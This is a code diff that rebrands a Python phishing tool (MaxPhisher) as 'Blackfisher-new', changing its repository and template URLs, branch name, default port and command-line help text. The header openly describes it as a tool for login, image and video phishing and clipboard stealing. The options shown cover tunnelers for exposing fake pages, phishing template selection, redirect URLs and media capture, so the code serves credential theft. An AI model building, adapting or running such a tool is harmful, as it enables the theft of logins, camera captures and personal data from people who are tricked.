@@ -6,7 +6,7 @@
 # License    : 
 # Copyright  : kuldeep (2021-2022)
 # Github   : https://github.com/Kaswan2793/Blackfisher-new.git
-# Contact    : https://m.me/KasRoudra
+# Contact    : https://github.com/Kaswan2793/Blackfisher-new
 # Description: Blackfisher is a phishing tool in python
 # Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
 # 1st Commit : 08/9/2022
@@ -141,7 +141,7 @@ info2  =   f"{green}[{white}•{green}] {purple}"
 
 # Modifying this could be potentially dangerous
 logo = f"""
-{red}                (\_/) 
+{red}              (\_/) 
 {cyan}|            (•.•) 
 {yellow}|          (   ) 
 {blue}| black
@@ -218,10 +218,10 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/MaxPhisher"
-sites_repo = "https://github.com/KasRoudra2/maxfiles"
+repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/Blackfisher-new"
+sites_repo = "https://github.com/Kaswan2793/Blackfiles"
 websites_url = f"{sites_repo}/archive/main.zip"
-repo_branch = "maxfiles-main"
+repo_branch = "Blackfiles-main"
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
@@ -269,7 +269,7 @@ else:
 print(f"\n{info}Please wait!{nc}")
 
 
-default_port = 8080
+default_port = 8484
 default_tunneler = "Cloudflared"
 default_fest = "Birthday"
 default_ytid = "6hHmkInZkMQ"
@@ -287,9 +287,9 @@ if not isdir(default_dir):
 
 argparser = ArgumentParser()
 
-argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"MaxPhisher's server port [Default : {default_port}]")
-argparser.add_argument("-t", "--type", help="MaxPhisher's phishing type index [Default : null]")
-argparser.add_argument("-o", "--option", help="MaxPhisher's template index [ Default : null ]")
+argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"Blackfisher-new's server port [Default : {default_port}]")
+argparser.add_argument("-t", "--type", help="Blackfisher-new's phishing type index [Default : null]")
+argparser.add_argument("-o", "--option", help="Blackfisher-new's template index [ Default : null ]")
 argparser.add_argument("-T", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
 argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
 argparser.add_argument("-S", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
@@ -298,7 +298,7 @@ argparser.add_argument("-f", "--fest", default=default_fest, help=f"Festival nam
 argparser.add_argument("-i", "--ytid", default=default_ytid, help=f"Youtube video ID for yttv template [Default : {default_ytid} (NASA Video)]")
 argparser.add_argument("-u", "--url", help="Redirection url for ip-tracking or login phishing [Default : null]")
 argparser.add_argument("-s", "--duration", type=int, default=default_duration, help=f"Media duration while capturing [Default : {default_duration}(ms)]")
-argparser.add_argument("-m", "--mode", help="Mode of MaxPhisher [Default: normal]")
+argparser.add_argument("-m", "--mode", help="Mode of Blackfisher-new [Default: normal]")
 argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
 argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
